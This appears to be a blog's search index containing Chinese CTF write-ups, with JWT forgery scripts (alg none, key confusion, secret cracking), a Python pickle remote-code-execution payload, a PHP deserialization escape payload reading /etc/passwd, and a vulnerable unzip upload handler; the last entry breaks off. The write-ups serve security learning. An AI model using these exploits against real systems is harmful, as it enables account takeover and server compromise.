<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ctfshow-jwt</title>
    <link href="/2024/09/07/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-jwt/"/>
    <url>/2024/09/07/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-jwt/</url>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>打开查看页面源码提示&#x2F;admin&#x2F;，抓包看看有没有东西，发现是jwt，放jwt.io里看一下没有加密方式，那就是简单的base64进行转化，这里利用hackerbar进行发包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;None&quot;</span>,<span class="hljs-string">&quot;typ&quot;</span>:<span class="hljs-string">&quot;jwt&quot;</span>&#125;[&#123;<span class="hljs-string">&quot;iss&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;iat&quot;</span>:1725711082,<span class="hljs-string">&quot;exp&quot;</span>:1725718282,<span class="hljs-string">&quot;nbf&quot;</span>:1725711082,<span class="hljs-string">&quot;sub&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;jti&quot;</span>:<span class="hljs-string">&quot;49c32732a51fddf321b60f8bd4e3b3fd&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p>这里把sub的user改成admin，然后再进行base64加密就行，放到原来的地方再发包得到flag</p><h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>正常流程用jwt.io检测一下，发现是  “alg”: “HS256”加密，JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。这里直接base64看不了，利用网站，自己脚本编一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>headers=&#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br>token_dict=&#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1725711820</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1725719020</span>,<br>  <span class="hljs-string">&quot;nbf&quot;</span>: <span class="hljs-number">1725711820</span>,<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;jti&quot;</span>: <span class="hljs-string">&quot;db9c8eec3e315880838b4b09ee3d8345&quot;</span><br>&#125;<br>jwt_token= jwt.encode(token_dict,<br>                      <span class="hljs-string">&quot;&quot;</span>,<br>                      algorithm=<span class="hljs-string">&quot;none&quot;</span>,<br>                      headers=headers)<br><span class="hljs-built_in">print</span>(jwt_token)<br></code></pre></td></tr></table></figure><p>流程和上一题基本一致</p><h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>不能直接改了，有弱口令提示，猜测常见的的弱密码，发现结果是123456，改admin，输入弱密码，得到jwt流程基本和前面一致。</p><h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>这题标题提示的是爆破，需要利用工具是c-jwt-cracker，去github可以搜到工具，爆破一下得到密钥，剩余流程和之前的差不多</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07204503.png" alt="2024-09-07204503"></p><h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2><p>先上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">/* GET home page. */<br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, function(req, res, <span class="hljs-built_in">next</span>) &#123;<br>  res.<span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  var privateKey = fs.readFileSync(process.cwd()+<span class="hljs-string">&#x27;//public//private.key&#x27;</span>);<br>  var token = jwt.sign(&#123; user: <span class="hljs-string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; algorithm: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br>  res.cookie(<span class="hljs-string">&#x27;auth&#x27;</span>,token);<br>  res.end(<span class="hljs-string">&#x27;where is flag?&#x27;</span>);<br>  <br>&#125;);<br><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>,function(req,res,<span class="hljs-built_in">next</span>)&#123;<br>var flag=<span class="hljs-string">&quot;flag_here&quot;</span>;<br>res.<span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>var auth = req.cookies.auth;<br>var cert = fs.readFileSync(process.cwd()+<span class="hljs-string">&#x27;//public/public.key&#x27;</span>);  // get public key<br>jwt.verify(auth, cert, function(err, decoded) &#123;<br>  <span class="hljs-keyword">if</span>(decoded.user===<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>  res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.end(<span class="hljs-string">&#x27;you are not admin&#x27;</span>);<br>  &#125;<br>&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>这题不一样了，是RS256，可以访问private.key和public.key，会下载密钥和公钥，把公私钥放进去流程也是一样，测试了一下在线网站好像不能直接运行啊，用python写个脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br>private = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;private.key&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>payload = &#123;<br>  <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1725719515</span><br>&#125;<br><br>headers = &#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;RS256&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br>token = jwt.encode(payload=payload,<br>                   key=private,<br>                   algorithm=<span class="hljs-string">&quot;RS256&quot;</span>,<br>                   headers=headers)<br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07224432.png" alt="2024-09-07224432"></p><h2 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h2><p>和上题大致一样，但是只给了public key,这题需要nodejs跑一下，先上个脚本吧</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">const jwt = require(&#x27;jsonwebtoken&#x27;);<br>var fs = require(&#x27;fs&#x27;);<br><br>var privateKey = fs.readFileSync(&#x27;public.key&#x27;);<br><br>var token = jwt.sign(<span class="hljs-punctuation">&#123;</span> user<span class="hljs-punctuation">:</span> &#x27;admin&#x27; <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> privateKey<span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span> algorithm<span class="hljs-punctuation">:</span> &#x27;HS256&#x27; <span class="hljs-punctuation">&#125;</span>);<br><br>console.log(token);<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07230802.png" alt="2024-09-07230802"></p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07230754.png" alt="2024-09-07230754"></p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>jwt(JSON Web Token)是一串json格式的字符串，由服务端用加密算法对信息签名来保证其完整性和不可伪造。Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息，JWT可用于身份认证、会话状态维持、信息交换等。它的出现是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://link.zhihu.com/?target=https://link.jianshu.com/?t=https://tools.ietf.org/html/rfc7519">(RFC 7519</a>).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。</p><p>一个jwt token 由三部分组成，header,payload和signature,以点隔开，类似于<code>orange.apple.banana</code>这个样子</p><ul><li>header用来声明token的类型和签名用的算法等，需要经过base64Url编码，比如</li></ul><p><code>&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</code></p><p>alg表示的是签名的算法，默认是HMAC SHA256(写成HS256)</p><p>typ表示这个令牌的类型，统一写作JWT</p><ul><li>payload用来表示真正的token信息，也需要base64Url编码，比如</li></ul><p><code>&#123;&quot;sub&quot;:&quot;1234567890&quot;,&quot;name&quot;:&quot;orange&quot;,&quot;iat&quot;:1516239022&#125;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">JWT 规定了7个官方字段，供选用<br>iss (issuer)：签发人<br>exp (expiration time)：过期时间<br>sub (subject)：主题<br>aud (audience)：受众<br>nbf (Not Before)：生效时间<br>iat (Issued At)：签发时间<br>jti (JWT ID)：编号<br></code></pre></td></tr></table></figure><ul><li>signature，将前两部分用<code>alg</code>指定的算法加密，再经过Base64Url编码就是signature了，作用是防止数据篡改。</li></ul><h2 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h2><p>正常使用<a href="https://jwt.io/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E8%A7%82%E7%9A%84%E4%BA%86%E8%A7%A3header%E5%92%8Cpayload">https://jwt.io/这个网站，可以直观的了解header和payload</a></p><p>爆破secret.key工具<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p><p>我使用的是docker起的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack jwt内容<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jwt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019ciscn-ikun</title>
    <link href="/2024/09/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2019ciscn-ikun/"/>
    <url>/2024/09/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2019ciscn-ikun/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2]ikun">在线靶场</a></p><p>一个生成的网站，有提示需要买到Lv6，然后就没有然后了</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>下面有很多Lv2-Lv5的，可以尝试写个脚本找到网页</p><p>点击图片看名称，<code>src=&quot;/static/img/lv/lv3.png&quot;</code>写脚本爆一下看看哪页有lv6.png的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://c66eb3e7-b146-49bb-b9c7-e58d5fef7173.node5.buuoj.cn:81/shop?page=&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">300</span>):<br>    response = requests.get(url+<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;lv6.png&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>可以在181页找到内容，这里先常规注册一个账号，给了10price</p><img src="/../../images/每日一题/2024-09-04155642.png" alt="2024-09-04155642" style="zoom:50%;"><p>很明显需要尝试改一下内容，购买的时候抓包一下，把discount改的很小就行</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04160139.png" alt="2024-09-04160139"></p><p>然后应该考察的内容是cookie的内容，发现有jwt,用jwt网站看一下内容，修改成admin需要有密钥，用工具可以跑一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/brendan-rius/c-jwt-cracker.git<br></code></pre></td></tr></table></figure><p>然后根据github上面的要求docker一下就行了，得到了密钥进行修改，将新的jwt修改发包刷新，看到一个压缩包，解压在Admin.py里发现了pickle的moudle,注意到有pickle的利用，在这边进行突破，最后得到flag</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>用分析的脚本搜索，进入?page&#x3D;181,然后点击购买就行抓包，利用jwt修改admin，需要爆破密钥</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04161841.png" alt="2024-09-04161841"></p><p>得到密钥是1Kun，随后修改得到可用的jwt</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04165203.png" alt="2024-09-04165203"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo<br></code></pre></td></tr></table></figure><p>修改成为admin,看网页的源码得到下载的<code>www.zip</code>定位到Admin.py里面的pickle,找到关键代码</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04162728.png" alt="2024-09-04162728"></p><p>尝试写利用脚本，这里需要注意的是用python2的环境，而且os.system并不会成功打通，可以使用commands进行利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&#x27;ls /&#x27;</span>,))<br><br>orange = exp()<br><br><span class="hljs-built_in">print</span>(urllib.quote(pickle.dumps(orange)))<br></code></pre></td></tr></table></figure><p>先ls找到了flag.txt，然后cat &#x2F;flag.txt，就可以得到flag了</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04164924.png" alt="2024-09-04164924"></p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jwt</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XGCTF-Ezzz_php</title>
    <link href="/2024/09/03/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/XGCTF-Ezzz_php/"/>
    <url>/2024/09/03/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/XGCTF-Ezzz_php/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a href="https://ctf.show/challenges#Ezzz_php-4404">在线靶场</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">read_file</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/etc/passwd&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;start=<span class="hljs-variable">$start</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;start == <span class="hljs-string">&quot;gxngxngxn&quot;</span>)&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;What you are reading is:&#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;start&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$readfile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">read_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;start&#x27;</span>]);<br>    <span class="hljs-variable">$read</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]:<span class="hljs-string">&quot;I_want_to_Read_flag&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$read</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$readfile</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ctf</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Start_Funny_CTF!!!&quot;</span>;<br>&#125; Start_Funny_CTF!!!<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>利用这个函数进行读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;start == <span class="hljs-string">&quot;gxngxngxn&quot;</span>)&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;What you are reading is:&#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>需要进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$read</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$readfile</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ctf</span>);<br></code></pre></td></tr></table></figure><p>先简单的测试一下在上部分构造序列化的样子</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-03162619.png" alt="2024-09-03162619"></p><p>传入gxngxngxn，长度为82。</p><p>接下来尝试利用file_get_contents，最常见的就是利用伪协议进行读取<code>php://filter/convert.base64-encode/resource=/etc/passwd</code></p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-03163445.png" alt="2024-09-03163445"></p><p>然后需要进行截取，详细的请看我nepctf的解析，简单的来说就是进行逃逸，利用%f0和%9f进行逃逸</p><p>需要逃逸的内容是<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:126:&quot;</code>,就是相当于覆盖前面的内容，用自己的链</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-03165332.png" alt="2024-09-03165332"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">read</span>=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f<br></code></pre></td></tr></table></figure><p>我对这个的理解就是增三减一，这题是38，构造13个%f0abc和1个%9f就可以达到覆盖的作用</p><p>通常到这一步应该就结束了，但是并不知道flag的文件名，还是需要命令执行，回收世界线。</p><p>官p给出的是考察了<a href="https://xz.aliyun.com/t/14690?time__1311=mqmx9QDtDQ0=ex0y34+g6YG8bou8xGIxx">CVE-2024-2961</a>,具体内容我们先按下不表，利用exp先打通一下。</p><p>这里借用的晨曦师傅的脚本，可以去了解一下，脚本需要微调一下，官方的也可以。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>其实环境弄了几个小时，一直有问题报错，基本的原理我已经懂了，先上payload吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">read</span>=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f&amp;start=O:9:<span class="hljs-string">&quot;read_file&quot;</span>:2:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:9:<span class="hljs-string">&quot;gxngxngxn&quot;</span>;s:8:<span class="hljs-string">&quot;filename&quot;</span>;s:55:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>;&#125;                              <br></code></pre></td></tr></table></figure><p>然后利用exp打通写马进去，这里注意环境要在3.10以上，尽量在linux环境，弄了半天没有完成orz，但是基本原理还是懂了的。</p><p>另起：昨天写完后回去突然就明白了,只需要把https改为http就可以成功了</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04153017.png" alt="2024-09-04153017"></p><p>然后读取flag</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04152836.png" alt="2024-09-04152836"></p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>serialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023ciscn-Unzip</title>
    <link href="/2024/09/02/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2023ciscn-Unzip/"/>
    <url>/2024/09/02/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2023ciscn-Unzip/</url>
    
    <content type="html"><![CDATA[<p>前言：😋，看到好友包师傅每日一题，我也打算开个每日一题，记录一下内容。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[在线靶场][<a href="https://ctf.show/challenges#Unzip-4002]">https://ctf.show/challenges#Unzip-4002]</a></p><p>初始界面是一个文件上传，随手上传一个一句话木马，进入页面。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this! </span><br></code></pre></td></tr></table></figure><h2 